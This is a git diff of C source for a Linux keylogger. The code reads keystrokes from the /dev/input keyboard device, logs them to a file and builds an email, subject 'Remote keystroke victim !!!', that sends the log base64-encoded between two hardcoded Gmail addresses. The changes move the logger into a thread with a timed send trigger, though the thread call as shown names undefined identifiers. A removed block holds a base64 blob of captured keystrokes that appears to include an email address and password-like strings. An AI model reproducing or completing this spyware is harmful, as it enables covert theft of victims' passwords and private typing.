@@ -5,13 +5,15 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <curl/curl.h>
+#include <sys/time.h>
+#include <pthread.h>
 
 #define LSIZ 70
 #define RSIZ 100
 #define FROM_MAIL     "doi2xuyenviet7@gmail.com"
 #define TO_MAIL       "nguyenngocdoanh1998@gmail.com"
 const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-char event_file_path[18] = "/dev/input/";
+char event_file_path[18] = "/dev/input/event";
 
 char * payload_text =
   "Content-Type: multipart/mixed; boundary================3165153444163065104==\r\n"
@@ -33,58 +35,6 @@ char * payload_image =
   "Content-ID: <1>\r\n\r\n";
 
 char * boundary =  "\r\n--===============3165153444163065104==--\r\n.\r\n";
-
-static const char * payload_text_ =
-  "Content-Type: multipart/mixed; boundary================3165153444163065104==\r\n"
-  "MIME-Version: 1.0\r\n"
-  "From: doi2xuyenviet7@gmail.com\r\n"
-  "To: nguyenngocdoanh1998@gmail.com\r\n"
-  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@rfcpedant.example.org>\r\n"
-  "Subject: Remote keystroke victim !!!\r\n\r\n"
-  "--===============3165153444163065104==\r\n"
-  "Content-Type: application/octet-stream\r\n"
-  "MIME-Version: 1.0\r\n"
-  "Content-Transfer-Encoding: base64\r\n"
-  "Content-Disposition: attachment; filename= log.txt\r\n\r\n"
-  "W0NUUkxdW1JJR0hUXWFbUklHSFRdW0NUUkxdYVtDVFJMXWFbUklHSFRdbmd1eWVubHNbU1BBQ0Vd\r\n"
-  "LWxhW0VOVEVSXVtDVFJMXWEyY2RbU1BBQ0VdbGlbVEFCXVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5U\r\n"
-  "RVJdY2F0W1NQQUNFXWxvW1RBQl1bRU5URVJdW1VQXVtFTlRFUl1bVVBdW0VOVEVSXVtVUF1bRU5U\r\n"
-  "RVJdbHNbU1BBQ0VdLWxhW0VOVEVSXW5ndXllbm5nb2Nkb2FuaDE5OThbU0hJRlRdMmdtYWlsLmNv\r\n"
-  "bVtFTlRFUl0xMjM0NTY3ODkyW1NISUZUXTEyM3F3ZWFzZFtFTlRFUl1jYXRbU1BBQ0VdbG9nW1RB\r\n"
-  "Ql1bRU5URVJdbHMtW1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQkFDS1NQQUNFXXNbU1BB\r\n"
-  "Q0VdLWxhW0VOVEVSXWNkW1NQQUNFXS4uW0VOVEVSXWxzW1NQQUNFXS1sYVtFTlRFUl1sc1tTUEFD\r\n"
-  "RV0tbGFbU1BBQ0Vdc2NyW1RBQl1lW1RBQl1bVEFCXVtUQUJdW0JBQ0tTUEFDRV1jZFtTUEFDRV1s\r\n"
-  "aVtUQUJdW0VOVEVSXWxzW1NQQUNFXS1sYVtFTlRFUl1bQ1RSTF1hMVtDVFJMXWFbUklHSFRdW1tD\r\n"
-  "VFJMXWFbW1VQXXFbQ1RSTF1hW1JJR0hUXW5hbm9bU1BBQ0VdW1NQQUNFXVtDVFJMXWEtbmFub1tT\r\n"
-  "UEFDRV1bQ1RSTF1hW1VQXVtDVFJMXWF4eWtbVEFCXVtTSElGVF0tW1RBQl1bRU5URVJdW0RPV05d\r\n"
-  "W0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW0RPV05dW1VQXVtVUF1b\r\n"
-  "VVBdW1VQXVtVUF1bVVBdW0RPV05dW2VuZF1bQ1RSTF1hLWxzW1NQQUNFXS1sYVtFTlRFUl1bQ1RS\r\n"
-  "TF1hW1JJR0hUXVtDVFJMXWFbUklHSFRdbmd1eWVubmdvY2RvYW5oMTk5OFtTSElGVF0yZ21haWwu\r\n"
-  "Y29tW0VOVEVSXWNvbmdbU1BBQ0VddHlbU1BBQ0VdYW5bU1BBQ0VdbmluaFtTUEFDRV1tYW5nW1NQ\r\n"
-  "QUNFXXZpZXR0ZWxbRU5URVJddmlldHRlbFtTUEFDRV1jeWJlcltTUEFDRV1zZWN1cml0eVtFTlRF\r\n"
-  "Ul1bQ1RSTF1hW1JJR0hUXW5ndXllbm5nb2Nkb2FuaDE5OThbU0hJRlRdMmdtYWlsLmNvbVtFTlRF\r\n"
-  "Ul1sc1tTUEFDRV0tbGFbRU5URVJdbltCQUNLU1BBQ0VdY29uZ1tTUEFDRV10eVtTUEFDRV1hbltT\r\n"
-  "UEFDRV1uaW5oW1NQQUNFXW1hbmdbU1BBQ0VddmlldHRlbFtFTlRFUl12aWV0dGVsW1NQQUNFXWN5\r\n"
-  "YmVyc2VjdXJpdHlbRU5URVJdaGFbU1BBQ0Vdbm9pW1NQQUNFXXZpZXRuYW1bRU5URVJdMjAvMTEv\r\n"
-  "MltCQUNLU1BBQ0VdMTk5OFtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdbHNsW0JBQ0tTUEFDRV1b\r\n"
-  "QkFDS1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQ1RSTF1hW1JJR0hUXWxzW1NQQUNFXS1s\r\n"
-  "YVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdaGhoaGhoaGhoaGhjW0NUUkxdamhnZGhnZ2pqaGZo\r\n"
-  "Z2Z5dGZoZmhnamhqaGdqaGdqW0VOVEVSXWFnbGdhZ2RrZ2FnbGtkYWxnW0NUUkxdYVtSSUdIVF1u\r\n"
-  "YW5vW1NQQUNFXXRlW1RBQl1bQkFDS1NQQUNFXVtCQUNLU1BBQ0VdW0JBQ0tTUEFDRV1bQkFDS1NQ\r\n"
-  "QUNFXVtCQUNLU1BBQ0Vdc1tUQUJdW0VOVEVSXWFnYWJnbG5ndXllbm5nb2Nkb2FuaDE5OThbU0hJ\r\n"
-  "RlRdMmdtYWlsLmNvbWFzO2RmamxramFzZDtmW0VOVEVSXWFqc2RmbDtraltFTlRFUl1hanNkbDtm\r\n"
-  "W0VOVEVSXWFzamQ7ZltFTlRFUl1bQ1RSTF1hLWxzW1NQQUNFXS1sYVtFTlRFUl1jYXRbU1BBQ0Vd\r\n"
-  "b1tUQUJdW0VOVEVSXVtVUF1bRU5URVJdW1VQXVtFTlRFUl1sc1tTUEFDRV0tbGFbRU5URVJdW1VQ\r\n"
-  "XVtFTlRFUl1bVVBdW0VOVEVSXVtVUF1bRU5URVJdW1VQXVtFTlRFUl1bVVBdW0VOVEVSXWNhdFtT\r\n"
-  "UEFDRV1vW1RBQl1bRU5URVJdW0NUUkxdYVtVUF1bQ1RSTF1heltDVFJMXWFbZ1tVUF1bVVBdW1VQ\r\n"
-  "XQ==\r\n"
-  "--===============3165153444163065104==--\r\n.\r\n"
-  "Content-Type: image/png\r\n"
-  "MIME-Version: 1.0\r\n"
-  "Content-Transfer-Encoding: base64\r\n"
-  "Content-ID: <1>\r\n\r\n"
-  "--===============3165153444163065104==--\r\n.\r\n";
-
 
 size_t b64_encoded_size(size_t inlen)
 {
@@ -136,16 +86,6 @@ char *b64_encode(const unsigned char *in, size_t len)
 	return out;
 }
 
-/*
-char* convert_bytes_to_base64(const char * data){
-	char       *enc;
-	printf("data:    '%s'\n", data);
-
-	enc = b64_encode((const unsigned char *)data, strlen(data));
-	printf("encoded: '%s'\n", enc);
-    return enc;
-}*/
-
 void find_event_file_path(){
     FILE *fp;
     char line[RSIZ][LSIZ];
@@ -167,11 +107,10 @@ void find_event_file_path(){
     for(i=0;i<lines;i++){
         //printf("%s\"\n", line[i]);
         if (strstr(line[i], "EV=120013") != NULL){
-            for(int j=0;j<i;j++){
+            for(int j=i-1;j>0;j--){
                 if (strstr(line[j], "Handlers") != NULL){
-                    line[j][strlen(line[j])-1] = '\0';
-                    char * item = strrchr(line[j],' ') + 1;
-                    strcat(event_file_path, item);
+                    strcat(event_file_path, strstr(line[j], "event") + 5);
+                    event_file_path[17] = '\0';
                     printf("%s\n", event_file_path);
                 }
             }
@@ -248,21 +187,6 @@ char* find_key(int code){
         case 108: return "[DOWN]";
         case 109: return "[PGDN]";
         default: return "";
-    }
-}
-
-void read_event_kdb(){
-    FILE * fp = fopen("log.txt", "a");
-    struct input_event event;
-    int events = open(event_file_path, O_RDONLY);
-    while(1){
-        read(events,&event, sizeof(event));
-        if(event.type == 1 && event.value == 1){
-            printf("Key: %i State: %i\n",event.code,event.value);
-            printf("Typed: %s\n",find_key(event.code));
-            fputs(find_key(event.code), fp);
-            //send_email();
-        }
     }
 }
 
@@ -345,9 +269,36 @@ char * concat_string(char * s1, char * s2, char* s3){
     return s4;
 }
 
+void *keylogger(){
+    find_event_file_path();
+    struct timeval start_time;
+    gettimeofday(&start_time, 0);
+    struct timeval current_time;
+
+    FILE * fp_out = fopen("log.txt", "a");
+    struct input_event event;
+    int events = open(event_file_path, O_RDONLY);
+    while(1){
+        read(events,&event, sizeof(event));
+        if(event.type == 1 && event.value == 1){
+            //printf("Key: %i State: %i\n",event.code,event.value);
+            //printf("Typed: %s\n",find_key(event.code));
+            fputs(find_key(event.code), fp_out);
+            fflush(fp_out);
+        }
+        gettimeofday(&current_time, 0);
+        if (current_time.tv_sec - start_time.tv_sec > 20){
+            printf("Trigger send email\n");
+            start_time = current_time;
+        }
+    }
+    fclose(fp_out);
+
+}
+
 int main() {
-    //find_event_file_path();
-    //read_event_kdb();
+    pthread_t tid_keylogger;
+    pthread_create(&tid, NULL, myThreadFun, (void *)&tid);
 
     FILE *fp_text;
     char *buff = malloc(sizeof(char) *1024);
@@ -356,13 +307,13 @@ int main() {
     char * enc = b64_encode((const unsigned char *)buff, strlen(buff));
     char * tmp = concat_string(payload_text, enc, payload_image);
     //printf("%s\n", payload_text);
-    char *buff1 = malloc(sizeof(char)*1024*1024);
-    FILE *fp_image = fopen("screen_enc.txt", "r");
-    fscanf(fp_image, "%s", buff1);
+    //char *buff1 = malloc(sizeof(char)*1024*1024);
+    //FILE *fp_image = fopen("screen_enc.txt", "r");
+    //fscanf(fp_image, "%s", buff1);
     //printf("%s\n", buff1);
-    payload_text = concat_string(tmp, buff1, boundary);
+    //payload_text = concat_string(tmp, buff1, boundary);
     //printf("%d\n", strlen(payload_text));
-    send_email();
+    //send_email();
     //free(buff);free(buff1);
     //free(tmp);free(tmp1);
     //free(enc);
